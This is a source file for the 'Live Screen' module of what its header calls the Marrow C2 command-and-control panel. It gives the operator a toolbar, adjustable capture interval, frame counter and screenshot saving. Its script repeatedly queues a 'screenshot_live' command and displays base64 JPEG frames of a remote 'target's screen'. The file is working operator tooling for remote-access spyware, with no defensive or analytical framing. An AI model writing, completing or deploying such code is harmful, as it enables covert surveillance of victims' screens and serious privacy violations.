<?php
// Marrow C2 - Live Screen Module
// Full multi-monitor capture with proper scaling
?>
<div id="ls-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-3">
            <span class="text-white font-medium">🖥️ Live Screen</span>
            <span id="ls-resolution" class="text-xs text-gray-500">--</span>
        </div>
        <div class="flex items-center gap-3">
            <div class="flex items-center gap-2 text-xs text-gray-400">
                <span>Interval:</span>
                <select id="ls-interval" class="bg-[#1a1f2e] border border-[#1e2433] rounded-lg px-2 py-1 text-sm"
                    onchange="LS.changeInterval()">
                    <option value="1000">1s (Fast)</option>
                    <option value="2000" selected>2s</option>
                    <option value="3000">3s</option>
                    <option value="5000">5s (Slow)</option>
                </select>
            </div>
            <div id="ls-fps" class="px-3 py-1 bg-[#1a1f2e] rounded-lg text-xs text-gray-400">
                <span id="ls-fps-val">0</span> FPS
            </div>
            <button onclick="LS.saveScreenshot()" class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm"
                title="Save Screenshot">💾</button>
            <button onclick="LS.fullscreen()" class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm"
                title="Fullscreen">⛶</button>
            <button onclick="LS.toggle()" id="ls-btn"
                class="px-4 py-2 bg-[#10b981] hover:bg-[#0ea573] text-white rounded-lg text-sm font-medium">
                ▶ Start
            </button>
        </div>
    </div>

    <!-- Screen View -->
    <div id="ls-viewport" class="flex-1 overflow-hidden bg-black flex items-center justify-center p-4">
        <!-- Placeholder -->
        <div id="ls-placeholder" class="text-center">
            <div class="text-6xl mb-4 opacity-50">🖥️</div>
            <h3 class="text-xl text-gray-400 mb-2">Live Screen Capture</h3>
            <p class="text-sm text-gray-600 mb-4">Click "Start" to begin streaming the target's screen</p>
            <p class="text-xs text-gray-700">Updates in real-time • Full multi-monitor support</p>
        </div>

        <!-- Actual Screen -->
        <img id="ls-screen" class="max-w-full max-h-full object-contain hidden rounded-lg shadow-2xl"
            style="image-rendering: auto;">
    </div>

    <!-- Connection Status Bar -->
    <div class="h-8 bg-[#0a0f1a] border-t border-[#1e2433] flex items-center justify-between px-4 text-xs">
        <div class="flex items-center gap-4">
            <div class="flex items-center gap-2">
                <div id="ls-status-dot" class="w-2 h-2 rounded-full bg-gray-600"></div>
                <span id="ls-status" class="text-gray-500">Stopped</span>
            </div>
            <span id="ls-latency" class="text-gray-600">--</span>
        </div>
        <span id="ls-frame-count" class="text-gray-600">0 frames</span>
    </div>
</div>

<style>
    #ls-viewport.fullscreen {
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        right: 0 !important;
        bottom: 0 !important;
        z-index: 9999 !important;
        padding: 0 !important;
    }

    #ls-screen {
        transition: opacity 0.1s;
    }
</style>

<script>
    const LS = {
        active: false,
        interval: null,
        intervalMs: 2000,
        frameCount: 0,
        lastFrame: null,
        fps: 0,

        toggle() {
            if (this.active) {
                this.stop();
            } else {
                this.start();
            }
        },

        start() {
            this.active = true;
            this.frameCount = 0;
            this.lastFrame = Date.now();

            document.getElementById('ls-btn').textContent = '⏹ Stop';
            document.getElementById('ls-btn').classList.remove('bg-[#10b981]', 'hover:bg-[#0ea573]');
            document.getElementById('ls-btn').classList.add('bg-[#ef4444]', 'hover:bg-[#dc2626]');
            document.getElementById('ls-status').textContent = 'Streaming...';
            document.getElementById('ls-status-dot').classList.remove('bg-gray-600');
            document.getElementById('ls-status-dot').classList.add('bg-[#10b981]', 'animate-pulse');

            this.capture();
            this.interval = setInterval(() => this.capture(), this.intervalMs);
        },

        stop() {
            this.active = false;
            if (this.interval) {
                clearInterval(this.interval);
                this.interval = null;
            }

            document.getElementById('ls-btn').textContent = '▶ Start';
            document.getElementById('ls-btn').classList.add('bg-[#10b981]', 'hover:bg-[#0ea573]');
            document.getElementById('ls-btn').classList.remove('bg-[#ef4444]', 'hover:bg-[#dc2626]');
            document.getElementById('ls-status').textContent = 'Stopped';
            document.getElementById('ls-status-dot').classList.add('bg-gray-600');
            document.getElementById('ls-status-dot').classList.remove('bg-[#10b981]', 'animate-pulse');
        },

        capture() {
            queueCommand('screenshot_live');
        },

        render(data) {
            if (data.includes('error')) {
                document.getElementById('ls-placeholder').style.display = 'block';
                document.getElementById('ls-screen').classList.add('hidden');
                document.getElementById('ls-placeholder').innerHTML = `<div class="text-red-400 text-lg">❌ Error</div><div class="text-gray-500 mt-2">${data}</div>`;
                return;
            }

            if (!data.startsWith('B64|')) return;

            const parts = data.split('|');
            if (parts.length < 4) return;

            const [_, width, height, b64] = parts;
            const img = document.getElementById('ls-screen');
            const placeholder = document.getElementById('ls-placeholder');

            // Update image
            img.src = 'data:image/jpeg;base64,' + b64;
            img.classList.remove('hidden');
            if (placeholder) placeholder.style.display = 'none';

            // Update stats
            this.frameCount++;
            const now = Date.now();
            const elapsed = (now - this.lastFrame) / 1000;
            if (elapsed > 0) {
                this.fps = (1 / elapsed).toFixed(1);
            }
            this.lastFrame = now;

            document.getElementById('ls-resolution').textContent = `${width} × ${height}`;
            document.getElementById('ls-fps-val').textContent = this.fps;
            document.getElementById('ls-frame-count').textContent = `${this.frameCount} frames`;
            document.getElementById('ls-latency').textContent = `${Math.round(elapsed * 1000)}ms`;
        },

        changeInterval() {
            this.intervalMs = parseInt(document.getElementById('ls-interval').value);
            if (this.active) {
                clearInterval(this.interval);
                this.interval = setInterval(() => this.capture(), this.intervalMs);
            }
        },

        saveScreenshot() {
            const img = document.getElementById('ls-screen');
            if (!img.src) return;

            const a = document.createElement('a');
            a.href = img.src;
            a.download = `screenshot_${Date.now()}.jpg`;
            a.click();
        },

        fullscreen() {
            const viewport = document.getElementById('ls-viewport');
            if (document.fullscreenElement) {
                document.exitFullscreen();
            } else {
                viewport.requestFullscreen();
            }
        }
    };
</script>